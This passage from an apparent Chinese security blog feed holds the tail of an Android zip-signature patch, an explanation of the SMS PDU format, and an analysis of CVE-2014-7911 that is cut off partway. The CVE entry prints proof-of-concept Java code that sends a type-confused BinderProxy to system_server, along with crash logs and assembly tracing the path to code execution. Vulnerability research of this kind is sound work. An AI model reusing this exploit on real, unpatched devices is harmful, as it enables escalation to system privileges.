lfh_start_bytes);</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">if</span> defined(__ANDROID__)</span></span><br><span class="line">+    android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">"64211847"</span>);</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   ALOGV(<span class="string">"+++ zip good scan %"</span> PRIu16 <span class="string">" entries"</span>, num_entries);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="为什么V2签名机制不受影响？"><a href="#为什么V2签名机制不受影响？" class="headerlink" title="为什么V2签名机制不受影响？"></a>为什么V2签名机制不受影响？</h2><h2 id="APK-APK的方式是否可行？"><a href="#APK-APK的方式是否可行？" class="headerlink" title="APK+APK的方式是否可行？"></a>APK+APK的方式是否可行？</h2><h2 id="recovery如何验证签名？"><a href="#recovery如何验证签名？" class="headerlink" title="recovery如何验证签名？"></a>recovery如何验证签名？</h2><h2 id="历史上的签名漏洞"><a href="#历史上的签名漏洞" class="headerlink" title="历史上的签名漏洞"></a>历史上的签名漏洞</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>手机短信PDU格式分析</title>
      <link href="/2017/12/10/%E6%89%8B%E6%9C%BA%E7%9F%AD%E4%BF%A1PDU%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2017/12/10/%E6%89%8B%E6%9C%BA%E7%9F%AD%E4%BF%A1PDU%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Text模式和PDU模式"><a href="#Text模式和PDU模式" class="headerlink" title="Text模式和PDU模式"></a>Text模式和PDU模式</h1><p>目前，发送短消息常用Text和PDU(Protocol Data Unit，协议数据单元)模式。使用Text模式收发短信代码简单，实现起来十分容易，但最大的缺点是不能收发中文短信；而PDU模式不仅支持中文短信，也能发送英文短信。</p><p>PDU模式收发短信可以使用3种编码：7-bit、8-bit和UCS2编码。7-bit编码用于发送普通的ASCII字符，8-bit编码通常用于发送数据消息，UCS2编码用于发送Unicode字符。一般的PDU编码由A B C D E F G H I J K L M十三项组成。</p><blockquote><p>A：短信息中心地址长度，2位十六进制数(1字节)。<br>B：短信息中心号码类型，2位十六进制数。<br>C：短信息中心号码，B+C的长度将由A中的数据决定。<br>D：文件头字节，2位十六进制数。<br>E：信息类型，2位十六进制数。<br>F：被叫号码长度，2位十六进制数。<br>G：被叫号码类型，2位十六进制数，取值同B。<br>H：被叫号码，长度由F中的数据决定。<br>I：协议标识，2位十六进制数。<br>J：数据编码方案，2位十六进制数。<br>K：有效期，2位十六进制数。<br>L：用户数据长度，2位十六进制数。<br>M：用户数据，其长度由L中的数据决定。J中设定采用UCS2编码，这里是中英文的Unicode字符。</p></blockquote><h1 id="PDU举例"><a href="#PDU举例" class="headerlink" title="PDU举例"></a>PDU举例</h1><ul><li>例1<br>发送：SMSC号码是+8613800250500，对方号码是13693092030，消息内容是“Hello!”。从手机发出的PDU串可以是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08 91 68 31 08 20 05 05 F0 11 00 0D 91 68 31 96 03 29 30 F0 00 00 00 06 C8 32 9B FD 0E 01</span><br></pre></td></tr></table></figure></li></ul><p>对照规范，具体分析：<br>SMSC#+8613800250500<br>Sender:+8613693092030<br>TP_PID:00<br>TP_DCS:00<br>TP_DCS-popis:Uncompressed Text<br>class:0<br>Alphabet:Default</p><p>Hello!<br>Length:6</p><p>(<a href="http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm" target="_blank" rel="noopener">在线解析和生成PDU</a>     <a href="http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm" target="_blank" rel="noopener">http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm</a>)</p><table><thead><tr><th>分段</th><th style="text-align:center">含义</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>08</td><td style="text-align:center">SMSC地址信息的长度</td><td style="text-align:right">共8个八位字节(包括91)</td></tr><tr><td>91</td><td style="text-align:center">SMSC地址格式(TON/NPI)</td><td style="text-align:right">用国际格式号码(在前面加‘+’)</td></tr><tr><td>68 31 08 20 05 05 F0</td><td style="text-align:center">SMSC地址</td><td style="text-align:right">8613800250500，补‘F’凑成偶数个</td></tr><tr><td>11</td><td style="text-align:center">基本参数(TP-MTI/VFP)</td><td style="text-align:right">发送，TP-VP用相对格式</td></tr><tr><td>00</td><td style="text-align:center">消息基准值(TP-MR)</td><td style="text-align:right">0</td></tr><tr><td>0D</td><td style="text-align:center">目标地址数字个数</td><td style="text-align:right">共13个十进制数(不包括91和‘F’)</td></tr><tr><td>91</td><td style="text-align:center">目标地址格式(TON/NPI)</td><td style="text-align:right">用国际格式号码(在前面加‘+’)</td></tr><tr><td>68 31 96 03 29 30 F0</td><td style="text-align:center">目标地址(TP-DA) 8613693092030，补‘F’凑成偶数个</td></tr><tr><td>00</td><td style="text-align:center">协议标识(TP-PID)</td><td style="text-align:right">是普通GSM类型，点到点方式</td></tr><tr><td>00</td><td style="text-align:center">用户信息编码方式(TP-DCS)</td><td style="text-align:right">7-bit编码</td></tr><tr><td>00</td><td style="text-align:center">有效期(TP-VP)</td><td style="text-align:right">5分钟</td></tr><tr><td>06</td><td style="text-align:center">用户信息长度(TP-UDL)</td><td style="text-align:right">实际长度6个字节</td></tr><tr><td>C8</td><td style="text-align:center">32 9B FD 0E 01</td><td style="text-align:right">用户信息(TP-UD) “Hello!”</td></tr></tbody></table><ul><li>例2<br>接收：SMSC号码是+8613800250500，对方号码是13693092030，消息内容是“你好!”。手机接收到的PDU串可以是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08 91 68 31 08 20 05 05 F0 84 0D 91 68 31 96 03 29 30 F0 00 08 30 30 21 80 63 54 80 06 4F 60 59 7D 00 21</span><br></pre></td></tr></table></figure></li></ul><p>对照规范，具体分析：<br>SMSC#+8613800250500<br>Sender:+8613693092030<br>TimeStamp:12/03/03 08:36:45<br>TP_PID:00<br>TP_DCS:08<br>TP_DCS-popis:Uncompressed Text<br>class:0<br>Alphabet:UCS2(16)bit</p><p>你好!<br>Length:3<br>(在线解析和生成PDU     <a href="http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm" target="_blank" rel="noopener">http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm</a>)</p><table><thead><tr><th>分段</th><th>含义</th><th>说明</th></tr></thead><tbody><tr><td>08</td><td>地址信息的长度</td><td>个八位字节(包括91)</td></tr><tr><td>91</td><td>SMSC地址格式(TON/NPI)</td><td>用国际格式号码(在前面加‘+’)</td></tr><tr><td>68 31 08 20 05 05 F0</td><td>SMSC地址</td><td>8613800250500，补‘F’凑成偶数个</td></tr><tr><td>84</td><td>基本参数(TP-MTI/MMS/RP)</td><td>接收，无更多消息，有回复地址</td></tr><tr><td>0D</td><td>回复地址数字个数</td><td>共13个十进制数(不包括91和‘F’)</td></tr><tr><td>91</td><td>回复地址格式(TON/NPI)</td><td>用国际格式号码(在前面加‘+’)</td></tr><tr><td>68 31 96 03 29 30 F0</td><td>回复地址(TP-RA)</td><td>8613693092030，补‘F’凑成偶数个</td></tr><tr><td>00</td><td>协议标识(TP-PID)</td><td>是普通GSM类型，点到点方式</td></tr><tr><td>08</td><td>用户信息编码方式(TP-DCS)</td><td>UCS2编码</td></tr><tr><td>30 30 21 80 63 54 80</td><td>时间戳(TP-SCTS)</td><td>2003-3-12 08:36:45  +8时区</td></tr><tr><td>06</td><td>用户信息长度(TP-UDL)</td><td>实际长度6个字节</td></tr><tr><td>4F 60 59 7D 00 21</td><td>用户信息(TP-UD)</td><td>“你好!”</td></tr></tbody></table><h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><p><strong>PDU的文本可以采用三种编码方式来对发送的内容进行编码，它们是7-bit、8-bit和UCS2编码。</strong></p><ul><li>7-bit编码用于发送普通的ASCII字符，它将一串7-bit的字符(最高位为0)编码成8-bit的数据，每8个字符可“压缩”成7个；</li><li>8-bit编码通常用于发送数据消息，比如图片和铃声等；</li><li>UCS2编码用于发送Unicode字符。</li></ul><p>PDU串的用户信息(TP-UD)段最大容量是140字节，所以在这三种编码方式下，可以发送的短消息的最大字符数分别是160、140（字节）和70。这里，将一个英文字母、一个汉字和一个数据字节都视为一个字符。</p><p>（短信160个字符按照7位ASCII编码来换算，即160×7=1120位；汉字按照8位UCS-2编码，也就是说8位即1个字节，1个汉字又占2个字节，那么换算为汉字数就是1120/8/2=70。所以，一条短信是可以发160个英文或70个汉字的。）</p><p>参考链接：<br>微博为什么140字 <a href="http://www.woshipm.com/pd/306996.html" target="_blank" rel="noopener">http://www.woshipm.com/pd/306996.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cve-2014-7911</title>
      <link href="/2017/12/09/cve-2014-7911/"/>
      <url>/2017/12/09/cve-2014-7911/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>CVE-2014-7911是安卓上序列化的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。漏洞的成因源于在安卓系统（&lt;5.0）中，java.io.ObjectInputStream并未校验输入的java对象是否是实际可序列化的。攻击者因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>向system_server传入的不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含native代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。</p><p>下面主要结合POC对漏洞进行详细分析。</p><ol><li><p>构建可序列化对象</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class BinderProxy implements Serializable &#123;</span><br><span class="line">private static final long serialVersionUID = 0;</span><br><span class="line">private int mObject = 0x1337beef;</span><br><span class="line">private int mOrgue = 0x1337beef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> mOrgue和mObject的类型参照源码（frameworks/base/core/java/android/os/Binder.java）</p></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = new Bundle();</span><br><span class="line">AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();</span><br><span class="line">bundle.putSerializable(&quot;eatthis&quot;, evilProxy);</span><br></pre></td></tr></table></figure>AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象</code></pre><ol><li><p>准备传入system_server的数据</p><p> 通过一系列java的反射机制，获得android.os.IUserManager.Stub和andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口mRemote，以及调用UserManager.setApplicationRestriction函数的TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class stubClass = null;</span><br><span class="line">for (Class inner : Class.forName(&quot;android.os.IUserManager&quot;).getDeclaredClasses()) &#123;</span><br><span class="line">    if (inner.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) &#123;</span><br><span class="line">        stubClass = inner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(true);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(null);</span><br><span class="line">Class proxyClass = null;</span><br><span class="line">for (Class inner : stubClass.getDeclaredClasses()) &#123;</span><br><span class="line">    if (inner.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) &#123;</span><br><span class="line">        proxyClass = inner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line">Field mServiceField = UserManager.class.getDeclaredField(&quot;mService&quot;);</span><br><span class="line">mServiceField.setAccessible(true);</span><br><span class="line">Object mService = mServiceField.get(userManager);</span><br><span class="line">Field mRemoteField = proxyClass.getDeclaredField(&quot;mRemote&quot;);</span><br><span class="line">mRemoteField.setAccessible(true);</span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br><span class="line">UserHandle userHandle = android.os.Process.myUserHandle();</span><br><span class="line">setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</span><br></pre></td></tr></table></figure><p> system_server进程拥有system权限，通过将对象传递给system_server，利用一些技巧达到提权到system的目的。</p></li><li>传入不可序列化对象</li></ol><p>调用setApplicationRestrictions这个函数，传入之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">private void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException &#123;</span><br><span class="line">android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">try &#123;</span><br><span class="line">   _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">   _data.writeString(packageName);</span><br><span class="line">   _data.writeInt(1);</span><br><span class="line">   restrictions.writeToParcel(_data, 0);</span><br><span class="line">   _data.writeInt(userHandle);</span><br><span class="line">   byte[] data = _data.marshall();</span><br><span class="line">   for (int i=0; true; i++) &#123;</span><br><span class="line">       if (data[i] == &apos;A&apos; &amp;&amp; data[i+1] == &apos;A&apos; &amp;&amp; data[i+2] == &apos;d&apos; &amp;&amp; data[i+3] == &apos;r&apos;) &#123;</span><br><span class="line">           data[i] = &apos;a&apos;;</span><br><span class="line">           data[i+1] = &apos;n&apos;;</span><br><span class="line">           break;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   _data.recycle();</span><br><span class="line">   _data = Parcel.obtain();</span><br><span class="line">   _data.unmarshall(data, 0, data.length);</span><br><span class="line">   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);</span><br><span class="line">   _reply.readException();</span><br><span class="line">&#125;</span><br><span class="line">finally &#123;</span><br><span class="line">   _reply.recycle();</span><br><span class="line">   _data.recycle();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装POC后，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</span><br><span class="line">05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</span><br><span class="line">05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</span><br><span class="line">...</span><br><span class="line">I/DEBUG   (  241): backtrace:</span><br><span class="line">I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</span><br><span class="line">I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so</span><br><span class="line">I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</span><br><span class="line">I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so</span><br><span class="line">I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)</span><br><span class="line">I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</span><br><span class="line">I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</span><br><span class="line">I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</span><br><span class="line">I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so</span><br><span class="line">I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)</span><br><span class="line">I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)</span><br></pre></td></tr></table></figure><h2 id="0x02-crash分析"><a href="#0x02-crash分析" class="headerlink" title="0x02 crash分析"></a>0x02 crash分析</h2><p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。<br>android.os.BinderProxy的finalize方法调用native代码，将mOrgue处理为指针：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void finalize() throws Throwable &#123;</span><br><span class="line">try &#123;</span><br><span class="line">destroy();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">super.finalize();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，destroy为native方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private native final void destroy();</span><br></pre></td></tr></table></figure><p>cpp代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj)</span><br><span class="line">&#123;</span><br><span class="line">IBinder* b = (IBinder*)</span><br><span class="line">env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">LOGDEATH(&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;, obj, b, drl);</span><br><span class="line">env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);</span><br><span class="line">env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);</span><br><span class="line">drl-&gt;decStrong((void*)javaObjectForIBinder);</span><br><span class="line">b-&gt;decStrong((void*)javaObjectForIBinder);</span><br><span class="line">IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终native代码调用上述decStrong方法，从</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br></pre></td></tr></table></figure><p>这一行可以看出，drl就是mOrgue，可以被攻击者控制。 所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。</p><p>再看一下RefBase类中的decStrong方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void RefBase::decStrong(const void* id) const</span><br><span class="line">&#123;</span><br><span class="line">weakref_impl* const refs = mRefs;</span><br><span class="line">refs-&gt;removeStrongRef(id);</span><br><span class="line">const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line">#if PRINT_REFS</span><br><span class="line">ALOGD(&quot;decStrong of %p from %p: cnt=%d\n&quot;, this, id, c);</span><br><span class="line">#endif</span><br><span class="line">ALOG_ASSERT(c &gt;= 1, &quot;decStrong() called on %p too many times&quot;, refs);</span><br><span class="line">if (c == 1) &#123;</span><br><span class="line">refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">delete this;</span><br><span class="line">&#125;</span><br><span class="line">refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。</p><h2 id="0x03-汇编分析"><a href="#0x03-汇编分析" class="headerlink" title="0x03 汇编分析"></a>0x03 汇编分析</h2><p>将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)：</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>首先对r0的使用，是在decStrong的前下面三行代码之中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weakref_impl* const refs = mRefs;</span><br><span class="line">refs-&gt;removeStrongRef(id);</span><br><span class="line">const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br></pre></td></tr></table></figure><p>对应的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</span><br><span class="line">mov r6, r1</span><br><span class="line">mov r0, r4</span><br><span class="line">blx &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure><p>首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br></pre></td></tr></table></figure><p>这被翻译为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov r0, r4  # r4指向mStrong，r0指向mStrong</span><br><span class="line">blx &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure><p>作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。<br>另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void removeStrongRef(const void* /*id*/) &#123; &#125;</span><br></pre></td></tr></table></figure><p>在调用android_atomic_dec后，出现的是以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (c == 1) &#123;</span><br><span class="line">refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp r0, #1          # r0 = refs-&gt;mStrong</span><br><span class="line">bne.n d1ea</span><br><span class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</span><br><span class="line">mov r1, r6</span><br><span class="line">ldr r3, [r0, #0] </span><br><span class="line">ldr r2, [r3, #12]</span><br><span class="line">blx r2</span><br></pre></td></tr></table></figure><p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1。<br>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p><ol><li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li><li>refs-&gt;mStrong必须为1;</li><li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(*(*(mOrgue+4)) == 1) &#123;</span><br><span class="line">refs = *(mOrgue+4);</span><br><span class="line">r2 = *(*(*(refs+8))+12);</span><br><span class="line">blx r2 ; &lt;—— controlled;</span><br><span 